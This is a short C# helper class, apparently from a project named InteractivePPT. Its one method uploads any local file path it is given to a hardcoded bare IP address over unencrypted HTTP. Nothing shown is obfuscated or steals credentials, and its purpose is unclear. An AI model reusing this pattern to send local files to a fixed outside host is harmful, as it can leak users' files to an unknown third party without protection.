using System;

namespace InteractivePPT
{
    class FileClass
    {
        public static void uploadFile(string path)
        {
            System.Net.WebClient client = new System.Net.WebClient();
            client.Headers.Add("Content-Type", "binary/octet-stream");

            byte[] result = client.UploadFile("http://46.101.68.86/upload.php", "POST", path);

            String s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
            client.Dispose();
        }
    }
}
